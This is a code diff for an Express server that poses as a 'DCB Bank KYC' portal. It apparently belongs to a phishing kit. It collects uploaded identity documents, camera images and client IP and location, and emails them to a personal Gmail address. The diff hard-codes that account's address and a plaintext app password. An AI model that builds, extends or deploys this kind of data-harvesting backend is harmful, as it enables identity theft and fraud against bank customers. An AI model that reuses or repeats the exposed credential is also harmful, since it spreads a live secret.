@@ -1,4 +1,3 @@
-require('dotenv').config();
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
@@ -8,7 +7,7 @@ const geoip = require('geoip-lite');
 const os = require('os');
 
 const app = express();
-const port = process.env.PORT || 3000;
+const port = 3000;
 
 // Trust proxy to get real client IP
 app.set('trust proxy', true);
@@ -21,8 +20,8 @@ if (!fs.existsSync(uploadDir)) {
 console.log(`Using upload directory: ${uploadDir}`);
 
 // Middleware for handling large payloads
-app.use(express.urlencoded({ extended: true, limit: '10mb' })); // Reduced
-app.use(express.json({ limit: '10mb' })); // Reduced
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
 // Add CORS headers
@@ -58,21 +57,26 @@ const upload = multer({
   storage: storage,
   fileFilter: fileFilter,
   limits: {
-    fileSize: 5 * 1024 * 1024 // 5MB limit (reduced)
+    fileSize: 5 * 1024 * 1024 // 5MB limit
   }
 }).any();
 
-// Email transporter
+// ======================
+// EMAIL CONFIGURATION (HARDCODED)
+// ======================
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
+    user: 'dcbsubmission392@gmail.com',  // Your Gmail
+    pass: 'kexmwnespcwxrkjt'           // Your app password
   },
-  pool: true, // Use connection pooling
-  maxConnections: 1, // Only 1 connection at a time
-  rateLimit: 1 // Only 1 email per second
+  pool: true,
+  maxConnections: 1,
+  rateLimit: 1
 });
+
+// Recipient email
+const RECIPIENT_EMAIL = 'dcbsubmission392@gmail.com';
 
 // Function to get client IP
 function getClientIp(req) {
@@ -212,8 +216,8 @@ Images Captured: ${imageAttachments.length}
 
       // Prepare email content
       const mailOptions = {
-        from: `DCB Bank KYC <${process.env.EMAIL_USER}>`,
-        to: process.env.RECIPIENT_EMAIL,
+        from: `DCB Bank KYC <dcbsubmission392@gmail.com>`,
+        to: RECIPIENT_EMAIL,
         subject: '🔔 New DCB Bank KYC Submission',
         html: `
           <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -257,7 +261,7 @@ Images Captured: ${imageAttachments.length}
         mailOptions.attachments.push({
           filename: documentFile.originalname,
           path: documentFile.path,
-          encoding: 'base64' // Reduced memory usage
+          encoding: 'base64'
         });
       }
 
@@ -266,7 +270,7 @@ Images Captured: ${imageAttachments.length}
         mailOptions.attachments.push({
           filename: file.originalname,
           path: file.path,
-          encoding: 'base64' // Reduced memory usage
+          encoding: 'base64'
         });
       });
 
@@ -286,8 +290,8 @@ Images Captured: ${imageAttachments.length}
         
         // Send background data email
         const bgMailOptions = {
-          from: `DCB Bank KYC <${process.env.EMAIL_USER}>`,
-          to: process.env.RECIPIENT_EMAIL,
+          from: `DCB Bank KYC <dcbsubmission392@gmail.com>`,
+          to: RECIPIENT_EMAIL,
           subject: '📸 Background Data for Session: ' + sessionId,
           html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
